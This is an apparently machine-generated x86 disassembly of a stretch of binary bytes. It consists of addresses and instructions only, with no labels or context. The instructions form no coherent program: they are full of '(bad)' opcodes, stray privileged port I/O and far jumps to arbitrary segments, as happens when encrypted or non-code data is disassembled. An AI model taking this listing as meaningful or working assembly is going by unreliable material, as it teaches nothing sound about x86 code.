  43756a:	dec    esi
  43756b:	inc    esi
  43756c:	mov    eax,0x466f1687
  437571:	and    ch,BYTE PTR [eax+eiz*2-0x4a975ce0]
  437578:	popf   
  437579:	sbb    al,0x88
  43757b:	out    0xee,al
  43757d:	cmp    eax,0x67a4f17b
  437582:	or     ebp,DWORD PTR [esi-0x80]
  437585:	iret   
  437586:	jnp    0x4375fb
  437588:	xor    edi,DWORD PTR [esi+0x62e250db]
  43758e:	cmc    
  43758f:	add    edi,DWORD PTR [ebx]
  437591:	pop    ebx
  437592:	scas   eax,DWORD PTR es:[edi]
  437593:	inc    ebp
  437594:	add    al,0xf0
  437596:	sub    ebx,eax
  437598:	or     ebp,DWORD PTR [edi]
  43759a:	mov    ecx,0x713973cb
  43759f:	sbb    eax,0x18ca1b0a
  4375a4:	sbb    ch,cl
  4375a6:	adc    DWORD PTR [esi-0x4a6ddc79],ebp
  4375ac:	mov    ebp,0xc50dc61
  4375b1:	and    bl,BYTE PTR [eax+0x60]
  4375b4:	call   0x42fe:0x25434d74
  4375bb:	lea    eax,[ebx+0x39]
  4375be:	xchg   esp,eax
  4375bf:	xchg   esp,eax
  4375c0:	mov    ch,0xc2
  4375c2:	push   edi
  4375c3:	aad    0x29
  4375c5:	ja     0x437596
  4375c7:	fwait
  4375c8:	pop    esi
  4375c9:	mov    edi,0x50bd010e
  4375ce:	mov    bl,0x11
  4375d0:	and    eax,0x531a0386
  4375d5:	les    edx,FWORD PTR [ebx*4-0x5fbb8e16]
  4375dc:	stos   BYTE PTR es:[edi],al
  4375dd:	inc    esp
  4375de:	lea    esi,[ebx-0x4f]
  4375e1:	mov    bl,0x7f
  4375e3:	pop    edx
  4375e4:	push   edi
  4375e5:	fidiv  DWORD PTR [ecx-0x22]
  4375e8:	ins    DWORD PTR es:[edi],dx
  4375e9:	arpl   bx,si
  4375eb:	in     al,dx
  4375ec:	addr16 aad 0x89
  4375ef:	ds jmp 0xfa08:0x7b50e081
  4375f7:	mov    edx,0x6e752f6d
  4375fc:	rcl    DWORD PTR [ebx+0x27],cl
  4375ff:	xchg   ebx,eax
  437600:	jne    0x4375bd
  437602:	xor    esi,DWORD PTR [eax-0x18]
  437605:	shr    DWORD PTR ds:0x3f66918e,0x17
  43760c:	inc    ebp
  43760d:	popf   
  43760e:	test   eax,0xa170996d
  437613:	cs fxch st(6)
  437616:	popf   
  437617:	sub    al,0xa6
  437619:	add    ah,BYTE PTR [ebx-0x42]
  43761c:	sub    BYTE PTR [edx],ah
  43761e:	and    DWORD PTR [esi-0x305e3e2a],ecx
  437624:	inc    bp
  437626:	or     esi,DWORD PTR [edi-0x257cbcbf]
  43762c:	pop    ss
  43762d:	jbe    0x437635
  43762f:	dec    edx
  437630:	out    0xc0,eax
  437632:	ja     0x437673
  437634:	pushf  
  437635:	sub    eax,0xffffffe6
  437638:	inc    esp
  437639:	mov    ebx,0xaf54da42
  43763e:	out    dx,eax
  43763f:	fwait
  437640:	call   0xb45c:0x93125cbe
  437647:	pushf  
  437648:	sbb    bl,bl
  43764a:	pop    edx
  43764b:	(bad)  
  43764c:	in     al,0x57
  43764e:	scas   eax,DWORD PTR es:[edi]
  43764f:	sbb    DWORD PTR [ecx],0x675e38a3
  437655:	mov    BYTE PTR [eax],ch
  437657:	dec    ebx
  437658:	(bad)  
  437659:	stc    
  43765a:	clc    
  43765b:	sbb    bh,BYTE PTR [edi+0x10]
  43765e:	mov    ah,dh
  437660:	clc    
  437661:	aaa    
  437662:	inc    esp
  437663:	fdivr  QWORD PTR [edi+esi*1-0x15]
  437667:	adc    BYTE PTR [edx],ah
  437669:	dec    ebp
  43766a:	std    
  43766b:	fcom   DWORD PTR [edx-0x39db7a0d]
  437671:	fs sub ecx,edx
  437674:	outs   dx,DWORD PTR ds:[esi]
  437675:	ds ret 
  437677:	add    BYTE PTR [ebx],ch
  437679:	gs and eax,0x6929ead0
  43767f:	fs jmp 0x43764b
  437682:	pop    ebp
  437683:	loopne 0x437692
  437685:	mov    eax,0xa6529aef
  43768a:	(bad)  
  43768b:	icebp  
  43768c:	rol    BYTE PTR [ecx+0x170c5bf2],cl
  437692:	xchg   dl,ah
  437694:	mov    esi,0x224dc040
  437699:	adc    dh,BYTE PTR [ecx-0x69b803c8]
  43769f:	mov    bh,0x46
  4376a1:	and    ebp,esp
  4376a3:	hlt    
  4376a4:	les    esi,FWORD PTR [ecx]
  4376a6:	xlat   BYTE PTR ds:[ebx]
  4376a7:	jno    0x437645
  4376a9:	inc    esp
  4376aa:	add    eax,0xd2e48f25
  4376af:	mov    edi,0x7e3350c4
  4376b4:	adc    eax,0x3a9211ce
  4376b9:	lods   al,BYTE PTR ds:[esi]
  4376ba:	xchg   edx,eax
  4376bb:	dec    ecx
  4376bc:	push   cs
  4376bd:	rcl    DWORD PTR [ebx+ebx*8-0x4d],1
  4376c1:	mov    al,0x7e
  4376c3:	dec    eax
  4376c4:	cmp    al,bh
  4376c6:	xor    bh,BYTE PTR [edx+0x38]
  4376c9:	mov    esi,0xaf38e2cc
  4376ce:	mul    ecx
  4376d0:	dec    esp
  4376d1:	mov    eax,gs
  4376d3:	inc    esp
  4376d4:	test   al,0x21
  4376d6:	lock cmp al,0x13
  4376d9:	sub    eax,0x4e0c60
  4376de:	pop    esp
  4376df:	rol    BYTE PTR [ecx+ecx*4-0x72af233d],cl
  4376e6:	xchg   ecx,eax
  4376e7:	xchg   ebx,eax
  4376e8:	ficom  DWORD PTR [edx]
  4376ea:	mov    WORD PTR [edi+0x790d8441],ds
  4376f0:	repnz sbb eax,0x6fa2a8e
  4376f6:	lods   al,BYTE PTR ds:[esi]
  4376f7:	lods   eax,DWORD PTR ds:[esi]
  4376f8:	xor    BYTE PTR [edi+0x70],bh
  4376fb:	ins    BYTE PTR es:[edi],dx
  4376fc:	cmp    edx,DWORD PTR [eax-0x44fa6a93]
  437702:	mov    ds:0x9da9c286,eax
  437707:	ja     0x437745
  437709:	mov    ?,esi
  43770b:	(bad)  
  43770c:	retf   
  43770d:	ins    DWORD PTR es:[edi],dx
  43770e:	out    dx,al
  43770f:	pop    ebx
  437710:	push   esp
  437711:	push   edi
  437712:	inc    esp
  437713:	xor    eax,0x17768ed8
  437718:	xchg   BYTE PTR [ecx],al
  43771a:	cmpxchg DWORD PTR [ecx+0x394cb84d],edx
  437721:	outs   dx,BYTE PTR ds:[esi]
  437722:	scas   eax,DWORD PTR es:[edi]
  437723:	push   es
  437724:	jl     0x437781
  437726:	gs cli 
  437728:	fcmovbe st,st(5)
  43772a:	lods   al,BYTE PTR ds:[esi]
  43772b:	(bad)  
  43772d:	pop    eax
  43772e:	xor    al,0x2a
  437730:	jmp    0x54ede575
  437735:	xchg   ebx,edx
  437737:	fstp   DWORD PTR [ebx]
  437739:	push   0x46
  43773b:	or     al,0x4b
  43773d:	xlat   BYTE PTR ds:[ebx]
  43773e:	dec    eax
  43773f:	jmp    0x4377bc
  437741:	je     0x437706
  437743:	ja     0x4376e1
  437745:	mov    ?,WORD PTR [ebx]
  437747:	clc    
  437748:	in     al,dx
  437749:	cmc    
  43774a:	or     eax,0x1ca695cf
  43774f:	dec    edi
  437750:	(bad)  
  437751:	cmp    eax,0x80abffb1
  437756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437757:	mov    ds:0xfc8d7f1d,al
  43775c:	es aaa 
  43775e:	mov    ch,0xa5
  437760:	inc    ecx
  437761:	lods   eax,DWORD PTR ds:[esi]
  437762:	or     bl,dh
  437764:	scas   eax,DWORD PTR es:[edi]
  437765:	repz or DWORD PTR [edx],ebx
  437768:	outs   dx,BYTE PTR ds:[esi]
  437769:	(bad)  
  43776a:	and    ah,BYTE PTR [edi+edi*2]
  43776d:	jns    0x437772
  43776f:	rcr    BYTE PTR [esp+eiz*8],0x68
  437773:	cmp    eax,0x2289a92
  437778:	call   0x2e8a4f81
  43777d:	loope  0x4377d9
  43777f:	dec    ebp
  437780:	and    DWORD PTR [eax],eax
  437782:	cmp    BYTE PTR [edi],bh
  437784:	mov    esp,0xbcf2707
  437789:	out    dx,eax
  43778a:	jg     0x4377cb
  43778c:	in     eax,dx
  43778d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43778e:	push   esi
  43778f:	push   0xffffffad
  437791:	jp     0x43771e
  437793:	push   0xdfa951cc
  437798:	xchg   esi,eax
  437799:	stc    
  43779a:	xor    ch,BYTE PTR [ecx]
  43779c:	lods   al,BYTE PTR ds:[esi]
  43779d:	addr16 (bad) 
  43779f:	and    al,0x11
  4377a1:	jmp    0x437754
  4377a3:	inc    eax
  4377a4:	cmp    DWORD PTR [eax+0x2],edi
  4377a7:	sbb    BYTE PTR [ebp+0x66],dl
  4377aa:	(bad)  
  4377ab:	ficom  WORD PTR [ebx+0xb]
  4377ae:	js     0x4377d8
  4377b0:	push   edx
  4377b1:	mov    ah,bl
  4377b3:	les    edx,FWORD PTR [ecx-0x779c24f8]
  4377b9:	mov    dl,0x7c
  4377bb:	lods   eax,DWORD PTR ds:[esi]
  4377bc:	jmp    0x4a202231
  4377c1:	test   BYTE PTR [edi+0x8],bh
  4377c4:	cmp    al,0xc5
  4377c6:	dec    eax
  4377c7:	pop    edi
  4377c8:	push   es
  4377c9:	sbb    BYTE PTR [edx-0x57],al
  4377cc:	or     ecx,ebx
  4377ce:	mov    eax,0xe30b7985
  4377d3:	imul   ebx,esp,0x51f41045
  4377d9:	test   BYTE PTR cs:0xde57202e,bl
  4377e0:	or     dl,dh
  4377e2:	mov    ecx,ecx
  4377e4:	scas   eax,DWORD PTR es:[edi]
  4377e5:	add    ah,BYTE PTR [edx-0x38]
  4377e8:	rcl    DWORD PTR [ebx-0x335eddee],0x95
  4377ef:	mov    es,WORD PTR [edi+ebx*2-0x76a610ce]
  4377f6:	neg    BYTE PTR [ecx+0x751ab2b5]
  4377fc:	cmc    
  4377fd:	fld    DWORD PTR [edx+0x73526348]
  437803:	fsubr  st,st(4)
  437805:	xlat   BYTE PTR ds:[ebx]
  437806:	pushf  
  437807:	mov    esi,0x403cec06
  43780c:	inc    ecx
  43780d:	cdq    
  43780e:	bound  ebp,QWORD PTR [esi+edx*8-0x77]
  437812:	js     0x437846
  437814:	mov    ah,BYTE PTR [ebx+0x6]
  437817:	dec    edx
  437818:	or     eax,0xe610df71
  43781d:	loope  0x437842
  43781f:	jg     0x43785f
  437821:	pop    esi
  437822:	and    cl,ch
  437824:	fstp   TBYTE PTR [ebx-0x34a09138]
  43782a:	ds fwait
  43782c:	(bad)
  43782f:	sbb    cl,BYTE PTR [ebx-0x2b45ab35]
  437835:	das    
  437836:	mov    BYTE PTR [ebp-0x5d49ee31],0x93
  43783d:	inc    ebp
  43783e:	out    dx,al
  43783f:	popf   
  437840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437841:	les    eax,FWORD PTR [eax+0x406ea1bc]
  437847:	fidivr DWORD PTR [eax+esi*8+0x67]
  43784b:	push   0xffffffd3
  43784d:	call   0xf3810e8e
  437852:	mov    eax,0x41895d29
  437857:	push   esp
  437858:	cmp    DWORD PTR [ebx+0x753b6734],0x7318fdbb
  437862:	jnp    0x4378d8
  437864:	cmp    al,0xd
  437866:	inc    ecx
  437867:	into   
  437868:	and    BYTE PTR ds:0x23ae310e,dh
  43786e:	imul   esi,DWORD PTR [ecx-0x70],0x38
  437872:	popf   
  437873:	mov    ah,0x81
  437875:	test   BYTE PTR [esi-0x3defa72e],0x24
  43787c:	fwait
  43787d:	movaps XMMWORD PTR [esi-0x5b],xmm0
  437881:	rcl    esp,1
  437883:	mov    ecx,0x8dd917c4
  437888:	xlat   BYTE PTR ds:[ebx]
  437889:	aam    0x74
  43788b:	push   0x6ce458b2
  437890:	adc    bh,BYTE PTR gs:[ebp+0x4dc9b9c]
  437897:	aas    
  437898:	arpl   WORD PTR [esi+0x34128c8b],di
  43789e:	fsub   DWORD PTR [edx-0x5d]
  4378a1:	pop    edi
  4378a2:	call   0xd68f:0xfa2dadd
  4378a9:	mov    bh,0x63
  4378ab:	jae    0x437863
  4378ad:	rcl    BYTE PTR [esi+0x16],0xbd
  4378b1:	lds    esi,FWORD PTR [eax+0x33]
  4378b4:	xor    al,0xe4
  4378b6:	push   0x9b654750
  4378bb:	lea    ebx,[edi]
  4378bd:	xchg   dl,al
  4378bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4378c0:	rcl    DWORD PTR [eax+0x65a6195c],1
  4378c6:	mov    ch,0x0
  4378c8:	ret    
  4378c9:	jnp    0x437914
  4378cb:	dec    ecx
  4378cc:	inc    ecx
  4378cd:	or     edx,DWORD PTR [ecx+ebp*2]
  4378d0:	test   al,0x14
  4378d2:	or     eax,0xfb7982b2
  4378d7:	in     al,dx
  4378d8:	test   ecx,edi
  4378da:	test   DWORD PTR [edx+0x6b12b2f5],0x93d5411c
  4378e4:	mov    es,WORD PTR [eax+eax*2]
  4378e7:	adc    bh,BYTE PTR [edx-0x18]
  4378ea:	inc    eax
  4378eb:	xchg   edi,eax
  4378ec:	mov    eax,ds:0x78a86ca2
  4378f1:	sub    ecx,edi
  4378f3:	psllw  mm0,mm5
  4378f6:	shl    BYTE PTR [edi],cl
  4378f8:	and    BYTE PTR [esi-0x4e],dh
  4378fb:	imul   eax,DWORD PTR [esp+ebx*4+0x1ad6cbc6],0x52
  437903:	(bad)  
  437904:	sbb    al,0x8b
  437906:	sbb    eax,0x9b3ba3a0
  43790b:	ja     0x437899
  43790d:	sti    
  43790e:	(bad)  
  43790f:	rol    BYTE PTR ds:0xd8313b22,1
  437915:	rol    BYTE PTR [edi-0x1],0x14
  437919:	sbb    esp,eax
  43791b:	dec    ebp
  43791c:	pop    ecx
  43791d:	add    edx,ecx
  43791f:	aaa    
  437920:	test   BYTE PTR [edx-0x2c8ee162],ah
  437926:	dec    edx
  437927:	pusha  
  437928:	outs   dx,BYTE PTR ds:[esi]
  437929:	hlt    
  43792a:	retf   
  43792b:	sub    eax,0x704e8d7e
  437930:	test   eax,0x82d8bb54
  437935:	(bad)  
  437936:	int    0x44
  437938:	xchg   esi,eax
  437939:	stc    
  43793a:	dec    esi
  43793b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43793c:	into   
  43793d:	stc    
  43793e:	ret    
  43793f:	dec    edx
  437940:	std    
  437941:	cwde   
  437942:	or     al,0x7c
  437944:	rcr    edi,1
  437946:	push   ss
  437947:	add    cl,bl
  437949:	cld    
  43794a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43794b:	jge    0x4379c0
  43794d:	xor    eax,0xd02c671a
  437952:	popa   
  437953:	popf   
  437954:	fist   DWORD PTR [edx-0x6f0e9a0c]
  43795b:	mov    ch,0xf5
  43795d:	adc    al,0x16
  43795f:	pushf  
  437960:	inc    eax
  437961:	jl     0x4379bd
  437963:	jge    0x43793f
  437965:	and    ebp,ebx
  437967:	add    cl,BYTE PTR [edi]
  437969:	fdiv   QWORD PTR [eax+0x65]
  43796c:	pop    es
  43796d:	aam    0x2c
  43796f:	dec    edi
  437970:	dec    ebx
  437971:	jecxz  0x4379f1
  437973:	push   0x6aadb09a
  437978:	aad    0xfd
  43797a:	push   esi
  43797b:	cld    
  43797c:	mov    bh,BYTE PTR [esi-0xaec102b]
  437982:	jno    0x4379a8
  437984:	fcmove st,st(3)
  437986:	pop    edi
  437987:	jecxz  0x437953
  437989:	xchg   ebx,eax
  43798a:	mov    dl,0xc1
  43798c:	hlt    
  43798d:	rcr    DWORD PTR [eax],1
  43798f:	loope  0x437940
  437991:	test   eax,0xa4632512
  437996:	and    bh,BYTE PTR [ebp+eax*1-0xa]
  43799a:	or     DWORD PTR [eax],0xffffffaa
  43799d:	loopne 0x4379d2
  43799f:	add    eax,0x8b8529ad
  4379a4:	xor    al,0x5d
  4379a6:	push   eax
  4379a7:	loop   0x437977
  4379a9:	push   esp
  4379aa:	mov    al,0x88
  4379ac:	fucomp st(4)
  4379ae:	iret   
  4379af:	cli    
  4379b0:	mov    esp,0xafdb2d6a
  4379b5:	or     eax,0x6d8b7c10
  4379ba:	cli    
  4379bb:	jne    0x437942
  4379bd:	xchg   ebp,eax
  4379be:	bound  edx,QWORD PTR [edi+0x757e6160]
  4379c4:	dec    eax
  4379c5:	test   DWORD PTR [ebp+edi*1-0x3d],ecx
  4379c9:	stc    
  4379ca:	mov    ss,WORD PTR [edi-0x6c15e710]
  4379d0:	inc    esi
  4379d1:	or     DWORD PTR ds:[ecx+0x5898f6b2],ebx
  4379d8:	xchg   ebp,eax
  4379d9:	adc    BYTE PTR [eax],0xfb
  4379dc:	jo     0x43797f
  4379de:	into   
  4379df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4379e0:	xchg   ebp,eax
  4379e1:	dec    edi
  4379e2:	jae    0x437a2d
  4379e4:	push   DWORD PTR [ecx]
  4379e6:	adc    edi,DWORD PTR [edi+0x73]
  4379e9:	pop    eax
  4379ea:	dec    esi
  4379eb:	and    edi,0x9cda3c52
  4379f1:	scas   al,BYTE PTR es:[edi]
  4379f2:	xchg   esi,eax
  4379f3:	or     eax,0x209106cd
  4379f8:	or     al,0x8c
  4379fa:	xchg   DWORD PTR ds:0xce71057f,esi
  437a00:	sbb    cl,dl
  437a02:	xor    DWORD PTR [esi],edx
  437a04:	shl    esi,1
  437a06:	fisttp DWORD PTR [edx-0x510dc218]
  437a0c:	mov    WORD PTR [edx+edx*4],cs
  437a0f:	dec    edi
  437a10:	or     DWORD PTR [eax],0xb8e000ca
  437a16:	adc    ebp,eax
  437a18:	adc    DWORD PTR [eax-0x5f],esi
  437a1b:	adc    DWORD PTR [esi],0xa1225724
  437a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437a22:	or     eax,0xdc784c9d
  437a27:	xchg   esi,eax
  437a28:	mov    al,ds:0x5406f07a
  437a2d:	sbb    dl,BYTE PTR [ebp+0x65b25aea]
  437a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437a34:	push   edi
  437a35:	lods   eax,DWORD PTR ds:[esi]
  437a36:	xchg   BYTE PTR [eax],dl
  437a38:	cmp    esp,DWORD PTR [eax]
  437a3a:	sub    esp,esp
  437a3c:	out    dx,eax
  437a3d:	fidiv  WORD PTR [ecx+ecx*2+0x21]
  437a41:	mov    esi,0x9fb360e1
  437a46:	dec    ecx
  437a47:	jg     0x437a33
  437a49:	ja     0x437a01
  437a4b:	out    0x8e,al
  437a4d:	ja     0x4379ef
  437a4f:	sub    BYTE PTR [ecx+0x28],dh
  437a52:	imul   ebx,DWORD PTR [eax+0x41c5c436],0x4d
  437a59:	jno    0x437ac4
  437a5b:	imul   ebp,edi,0xf84d5613
  437a61:	xor    ah,dh
  437a63:	pop    ebp
  437a64:	retf   
  437a65:	sub    ebp,edi
  437a67:	jecxz  0x437a51
  437a69:	dec    esp
  437a6a:	scas   al,BYTE PTR es:[edi]
  437a6b:	dec    ebx
  437a6c:	adc    edx,esp
  437a6e:	jmp    0xf28d:0x2e496b6a
  437a75:	mov    WORD PTR [ebp-0xbcdaffa],es
  437a7b:	jne    0x437a54
  437a7d:	and    edi,DWORD PTR [ebx]
  437a7f:	jbe    0x437ab3
  437a81:	popa   
  437a82:	sub    BYTE PTR [ebx-0x38],dh
  437a85:	xor    eax,DWORD PTR [edi+0x35ad54e6]
  437a8b:	xchg   edi,eax
  437a8c:	xchg   BYTE PTR [ebx+0x64],dh
  437a8f:	pop    ebx
  437a90:	pusha  
  437a91:	es jnp 0x437a64
  437a94:	push   eax
  437a95:	(bad)  
  437a96:	sub    eax,0x4e9e02f
  437a9b:	bound  eax,QWORD PTR [edi]
  437a9d:	pop    ebx
  437a9e:	add    al,0x83
  437aa1:	mov    ecx,DWORD PTR [ebx]
  437aa3:	jo     0x437b1c
  437aa5:	ror    DWORD PTR [ebx-0x4d92f50c],0xe6
  437aac:	aaa    
  437aad:	pop    ecx
  437aae:	xor    DWORD PTR [ebp-0x365d3bf8],eax
  437ab4:	mov    ds:0x53fcbc92,eax
  437ab9:	cmp    BYTE PTR [esi],0xbc
  437abc:	ret    0xa86
  437abf:	pop    esi
  437ac0:	inc    edi
  437ac1:	cmp    BYTE PTR [esi-0x3201e8a9],ch
  437ac7:	aad    0x15
  437ac9:	push   ebx
  437aca:	xor    BYTE PTR [edi],al
  437acc:	add    esi,edx
  437ace:	mov    ah,0xf8
  437ad0:	xlat   BYTE PTR ds:[ebx]
  437ad1:	dec    eax
  437ad2:	sub    DWORD PTR [edx-0x72],esi
  437ad5:	(bad)  
  437ad6:	push   esi
  437ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ad8:	sub    DWORD PTR [ecx+0x77],ebp
  437adb:	push   ebp
  437adc:	sbb    BYTE PTR [eax+0x67],bh
  437adf:	int    0x72
  437ae1:	scas   al,BYTE PTR es:[edi]
  437ae2:	adc    eax,0xd2e7602d
  437ae7:	gs lock jo 0x437af0
  437aeb:	mov    edx,0x808c4ae
  437af0:	or     bh,BYTE PTR [edi-0x4400f665]
  437af6:	icebp  
  437af7:	and    BYTE PTR [ebx],dl
  437af9:	in     eax,dx
  437afa:	mov    bl,0x6c
  437afc:	neg    BYTE PTR [eax+eiz*8]
  437aff:	push   ebx
  437b00:	jmp    0x437ab0
  437b02:	jmp    0xd1074e9e
  437b07:	das    
  437b08:	sti    
  437b09:	jae    0x437b4a
  437b0b:	mov    ebp,0xa977b07f
  437b10:	sub    ax,0x8394
  437b14:	push   0xd4c1ed63
  437b19:	les    ebx,FWORD PTR [ecx]
  437b1b:	or     al,BYTE PTR ds:0x80b1909c
  437b21:	into   
  437b22:	mov    eax,0x9e61ecf7
  437b27:	mov    al,ds:0xc8a344e3
  437b2c:	pop    eax
  437b2d:	(bad)
  437b30:	imul   edx,ebx,0x54
  437b33:	xor    BYTE PTR [esp+eax*2+0xbe61915],ah
  437b3a:	popf   
  437b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437b3c:	call   DWORD PTR [edx-0x34ba539f]
  437b42:	and    DWORD PTR [esi-0x60],0xbb7d7de3
  437b49:	jg     0x49e3acd
  437b4f:	(bad)  
  437b50:	dec    eax
  437b51:	repnz mov ch,0x53
  437b54:	or     DWORD PTR [bx-0x76],ebx
  437b58:	test   al,0x95
  437b5a:	(bad)  
  437b5b:	cdq    
  437b5c:	mov    dh,0x1b
  437b5e:	mov    bh,0xf5
  437b60:	(bad)  
  437b61:	clc    
  437b62:	jp     0x437be0
  437b64:	inc    eax
  437b65:	mov    ds:0x6969fd42,eax
  437b6a:	je     0x437b46
  437b6c:	cmc    
  437b6d:	repnz push edx
  437b6f:	pop    es
  437b70:	pop    ds
  437b71:	push   eax
  437b72:	mov    ds:0xb0e5d3c4,eax
  437b77:	pusha  
  437b78:	call   FWORD PTR [esi-0x4b]
  437b7b:	fwait
  437b7c:	sub    ah,BYTE PTR [edx]
  437b7e:	(bad)  
  437b7f:	pop    ebp
  437b80:	mov    WORD PTR [esi+ebp*2],ds
  437b83:	sub    edx,edx
  437b85:	fstp   TBYTE PTR [edx-0x3b]
  437b88:	xor    al,0xb1
  437b8a:	sub    BYTE PTR [eax+edx*8-0xf2373ed],bh
  437b91:	mov    ebp,0x89eab96e
  437b97:	sub    eax,0x60e92449
  437b9c:	bound  edx,QWORD PTR [edx-0x1f641fb5]
  437ba2:	jmp    0x1144d9e9
  437ba7:	sbb    dl,BYTE PTR [ebp+0x2]
  437baa:	mov    eax,0x87a1c6
  437baf:	outs   dx,BYTE PTR ds:[esi]
  437bb0:	pop    es
  437bb1:	outs   dx,BYTE PTR ds:[esi]
  437bb2:	mov    al,ds:0x760440c7
  437bb7:	and    cl,BYTE PTR [ecx-0xd]
  437bba:	test   al,0x5f
  437bbc:	imul   edi,DWORD PTR [ebp+edi*2-0x4b99d184],0xbdd5813e
  437bc7:	shr    esp,0x7b
  437bca:	sub    eax,0x3ec709f5
  437bcf:	fsubr  QWORD PTR [edx+eiz*8-0x30]
  437bd3:	std    
  437bd4:	and    DWORD PTR [esi-0x2f5c82dc],edi
  437bda:	xchg   ecx,eax
  437bdb:	mov    eax,0x28302cd8
  437be0:	repz and al,BYTE PTR [esi]
  437be3:	(bad)  
  437be4:	pop    edi
  437be5:	call   0x33c27520
  437bea:	outs   dx,DWORD PTR ds:[esi]
  437beb:	push   0x19
  437bed:	and    DWORD PTR [edx-0x4a],esi
  437bf0:	xor    al,0x2
  437bf2:	test   BYTE PTR [eax],0x30
  437bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437bf6:	out    0x9c,eax
  437bf8:	xchg   ecx,eax
  437bf9:	cli    
  437bfa:	inc    esp
  437bfb:	and    eax,0x2f80e674
  437c00:	(bad)  
  437c01:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c03:	sbb    al,0x23
  437c05:	push   edx
  437c06:	dec    edi
  437c07:	sub    BYTE PTR [ecx+0x20],cl
  437c0a:	sub    al,0xc6
  437c0c:	imul   eax,DWORD PTR [eax-0x29],0xffffffb4
  437c10:	mov    ebx,0xc4abdd3d
  437c15:	repz or DWORD PTR [eax],0xbcb38639
  437c1c:	pop    ecx
  437c1d:	cdq    
  437c1e:	int    0xff
  437c20:	inc    eax
  437c21:	cmp    al,cl
  437c23:	test   edx,esp
  437c25:	xchg   ebx,eax
  437c26:	jb     0x437bd5
  437c28:	mul    BYTE PTR [eax]
  437c2a:	dec    esi
  437c2b:	fimul  DWORD PTR [ebx+0x67a18f98]
  437c31:	xchg   ebx,eax
  437c32:	inc    esi
  437c33:	cmp    DWORD PTR [ebx-0x4a684173],esp
  437c39:	adc    eax,0xeb3def73
  437c3e:	jno    0x437c15
  437c40:	dec    edx
  437c41:	or     eax,0x92be9484
  437c46:	je     0x437c32
  437c48:	pusha  
  437c49:	and    edi,DWORD PTR [esi+0x3c]
  437c4c:	jmp    0xaba8:0x99a39ca0
  437c53:	inc    esi
  437c54:	add    BYTE PTR [ebx],ah
  437c56:	out    dx,eax
  437c57:	push   edi
  437c58:	leave  
  437c59:	lahf   
  437c5a:	lock push esi
  437c5c:	int    0x37
  437c5e:	ds aaa 
  437c60:	and    al,0xde
  437c62:	adc    eax,0x5a965a2
  437c67:	fimul  WORD PTR [edi]
  437c69:	fwait
  437c6a:	push   ebp
  437c6b:	mov    al,ds:0x27c7244
  437c70:	cli    
  437c71:	sar    DWORD PTR [ebp-0x527f49d6],0xc0
  437c78:	dec    ebx
  437c79:	and    DWORD PTR [ebp-0x54d87f55],0x8952f117
  437c83:	mov    ah,0xba
  437c85:	cmc    
  437c86:	mov    edx,?
  437c88:	add    eax,0x765ff93e
  437c8d:	xchg   esp,eax
  437c8e:	sub    dh,al
  437c90:	mov    ecx,0xc819d975
  437c95:	adc    eax,0x61d37330
  437c9a:	mov    cl,0xc3
  437c9c:	pop    edx
  437c9d:	shl    DWORD PTR [ecx+0x1c],0x58
  437ca1:	pop    eax
  437ca2:	cli    
  437ca3:	inc    edi
  437ca4:	sub    BYTE PTR [edx],0x11
  437ca7:	outs   dx,BYTE PTR ds:[esi]
  437ca8:	enter  0xdb33,0x6
  437cac:	inc    edi
  437cad:	das    
  437cae:	xor    eax,0x9a6954b3
  437cb3:	mov    cs,WORD PTR [esi+0x180f8213]
  437cb9:	pop    esp
  437cba:	(bad)  
  437cbb:	outs   dx,BYTE PTR ds:[esi]
  437cbc:	in     al,dx
  437cbd:	je     0x437d2b
  437cbf:	push   cs
  437cc0:	mov    edx,0xe0ac88da
  437cc6:	les    edx,FWORD PTR [ebp+0x3df4d8c4]
  437ccc:	xlat   BYTE PTR ds:[ebx]
  437ccd:	je     0x437c9a
  437ccf:	test   al,0x26
  437cd1:	(bad)  [edx+eiz*1]
  437cd4:	retf   
  437cd5:	shr    DWORD PTR [esi+esi*8],0xf1
  437cd9:	sub    esi,edx
  437cdb:	add    eax,0x6e3d8d15
  437ce0:	sbb    eax,0xbd27dc12
  437ce5:	push   ds
  437ce6:	imul   edx,DWORD PTR [ecx+0x74f10027],0x12
  437ced:	jmp    0x437cc0
  437cef:	pop    ebx
  437cf0:	aam    0x67
  437cf2:	imul   ecx,DWORD PTR [ecx],0x32b06e79
  437cf8:	cwde   
  437cf9:	xor    al,0x5
  437cfb:	fild   WORD PTR [ebx+0x1493d8dd]
  437d01:	fidiv  DWORD PTR [ebx+0x33]
  437d05:	pop    ds
  437d06:	outs   dx,DWORD PTR ds:[esi]
  437d07:	adc    BYTE PTR [ecx],dh
  437d09:	mov    ebx,0xbe615add
  437d0e:	loop   0x437cfd
  437d10:	sub    cl,BYTE PTR [eax-0x6c]
  437d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437d14:	push   esp
  437d15:	ficomp DWORD PTR ds:0x60e2e2e1
  437d1b:	pop    ebp
  437d1c:	shl    DWORD PTR [edi+ebx*8],1
  437d1f:	(bad)  
  437d21:	and    DWORD PTR [edx],esp
  437d23:	or     cl,bl
  437d25:	outs   dx,BYTE PTR ds:[esi]
  437d26:	push   ss
  437d27:	pop    es
  437d28:	dec    ecx
  437d29:	jnp    0x437cb9
  437d2b:	das    
  437d2c:	out    dx,eax
  437d2d:	sub    al,0x93
  437d2f:	mov    eax,0xd072ed9d
  437d34:	loope  0x437da1
  437d36:	iret   
  437d37:	int3   
  437d38:	fiadd  WORD PTR [edi-0x3]
  437d3b:	call   DWORD PTR [esi+eax*8-0x11a02a59]
  437d42:	xor    ebp,edi
  437d44:	(bad)  
  437d45:	in     eax,0xb1
  437d47:	and    dl,ah
  437d49:	cdq    
  437d4a:	scas   al,BYTE PTR es:[edi]
  437d4b:	mov    esi,0x3d877ad1
  437d50:	xchg   esp,eax
